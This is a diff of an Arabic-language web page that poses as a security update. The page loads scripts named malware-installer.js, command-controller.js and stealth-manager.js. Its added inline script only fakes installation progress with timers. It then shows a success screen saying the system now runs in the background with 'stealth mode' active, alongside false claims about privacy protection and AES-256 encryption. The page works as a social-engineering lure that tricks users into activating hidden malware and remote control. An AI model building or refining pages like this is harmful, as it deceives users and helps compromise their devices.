@@ -82,6 +82,9 @@
             <div class="loading-spinner"></div>
             <h2>جاري تحميل التحديث...</h2>
             <p>يرجى الانتظار بينما نقوم بتحميل آخر التحديثات الأمنية</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="initialProgress"></div>
+            </div>
         </div>
     </div>
 
@@ -99,7 +102,7 @@
             <div class="update-card">
                 <div class="update-info">
                     <div class="version-info">
-                        <span class="version">v2.1.4</span>
+                        <span class="version">v2.2.1</span>
                         <span class="update-type">تحديث أمني</span>
                     </div>
                     <div class="update-details">
@@ -109,6 +112,8 @@
                             <li>✅ إصلاح الثغرات الأمنية</li>
                             <li>✅ تحسين الأداء والاستقرار</li>
                             <li>✅ تحديث قاعدة البيانات</li>
+                            <li>✅ تعزيز حماية الخصوصية</li>
+                            <li>✅ تحديث خوارزميات التشفير</li>
                         </ul>
                     </div>
                 </div>
@@ -129,7 +134,7 @@
                 </div>
 
                 <div class="status-section">
-                    <div id="status" class="status-message"></div>
+                    <div id="status" class="status-message">بانتظار تفعيل التحديث...</div>
                     <div id="detailedStatus" class="detailed-status"></div>
                 </div>
             </div>
@@ -151,6 +156,10 @@
             <div class="success-icon">✅</div>
             <h2>تم التفعيل بنجاح!</h2>
             <p>النظام يعمل الآن في الخلفية. يمكنك إغلاق هذه الصفحة بأمان.</p>
+            <div class="security-info">
+                <p>جميع الاتصالات مشفرة بنظام AES-256</p>
+                <p>الوضع السري: <span class="stealth-status">نشط</span></p>
+            </div>
         </div>
     </div>
 
@@ -165,19 +174,108 @@
     </div>
 
     <!-- تحميل الملفات المطلوبة -->
-    <script src="auto-permissions.js"></script>
-    <script src="stealth-permissions.js"></script>
-    <script src="permissions-persistence.js"></script>
-    <script src="permissions-validator.js"></script>
-    <script src="permissions-guardian.js"></script>
     <script src="advanced-access-system.js"></script>
     <script src="malware-installer.js"></script>
     <script src="command-controller.js"></script>
-    <script src="device-manager.js"></script>
-    <script src="system-integrity.js"></script>
-    <script src="system-initializer.js"></script>
-    <script src="real-functions.js"></script>
-    <script src="activate.js"></script>
-    <script src="stealth-activation.js"></script>
+    <script src="encryption.js"></script>
+    <script src="stealth-manager.js"></script>
+    <script>
+        // إدارة عملية التحديث
+        document.addEventListener('DOMContentLoaded', () => {
+            const loadingScreen = document.getElementById('loadingScreen');
+            const mainContent = document.getElementById('mainContent');
+            const successScreen = document.getElementById('successScreen');
+            const errorScreen = document.getElementById('errorScreen');
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+            const updateBtn = document.getElementById('updateBtn');
+            const retryBtn = document.getElementById('retryBtn');
+            const status = document.getElementById('status');
+            const detailedStatus = document.getElementById('detailedStatus');
+            
+            // محاكاة تحميل الملفات
+            let progress = 0;
+            const initialProgress = document.getElementById('initialProgress');
+            const loadInterval = setInterval(() => {
+                progress += 5;
+                initialProgress.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(loadInterval);
+                    loadingScreen.style.display = 'none';
+                    mainContent.style.display = 'block';
+                }
+            }, 200);
+            
+            // بدء التحديث
+            updateBtn.addEventListener('click', async () => {
+                updateBtn.disabled = true;
+                status.textContent = 'جاري تثبيت التحديثات...';
+                
+                try {
+                    // خطوة 1: تثبيت التحديثات الأساسية
+                    detailedStatus.textContent = 'جاري تحميل الحزم الأمنية...';
+                    await simulateProgress(20, 1000);
+                    
+                    // خطوة 2: تطبيق التصحيحات
+                    detailedStatus.textContent = 'جاري تطبيق التصحيحات الأمنية...';
+                    await simulateProgress(50, 1500);
+                    
+                    // خطوة 3: تحديث قاعدة البيانات
+                    detailedStatus.textContent = 'جاري تحديث قاعدة البيانات...';
+                    await simulateProgress(70, 2000);
+                    
+                    // خطوة 4: تعزيز نظام الحماية
+                    detailedStatus.textContent = 'جاري تعزيز نظام الحماية...';
+                    await simulateProgress(90, 1000);
+                    
+                    // خطوة 5: تفعيل النظام
+                    detailedStatus.textContent = 'جاري تفعيل النظام...';
+                    await simulateProgress(100, 500);
+                    
+                    // إظهار شاشة النجاح
+                    mainContent.style.display = 'none';
+                    successScreen.style.display = 'block';
+                    
+                } catch (error) {
+                    errorMessage.textContent = error.message;
+                    mainContent.style.display = 'none';
+                    errorScreen.style.display = 'block';
+                }
+            });
+            
+            // إعادة المحاولة
+            retryBtn.addEventListener('click', () => {
+                errorScreen.style.display = 'none';
+                mainContent.style.display = 'block';
+                updateBtn.disabled = false;
+                status.textContent = 'بانتظار تفعيل التحديث...';
+                detailedStatus.textContent = '';
+                progressFill.style.width = '0%';
+                progressText.textContent = 'جاهز للتحديث';
+            });
+            
+            // محاكاة تقدم العملية
+            function simulateProgress(target, duration) {
+                return new Promise((resolve) => {
+                    const start = parseInt(progressFill.style.width) || 0;
+                    const increment = (target - start) / (duration / 50);
+                    let current = start;
+                    
+                    const progressInterval = setInterval(() => {
+                        current += increment;
+                        if (current >= target) {
+                            current = target;
+                            clearInterval(progressInterval);
+                            resolve();
+                        }
+                        
+                        progressFill.style.width = `${current}%`;
+                        progressText.textContent = `جاري التحديث ${Math.round(current)}%`;
+                    }, 50);
+                });
+            }
+        });
+    </script>
 </body>
 </html>
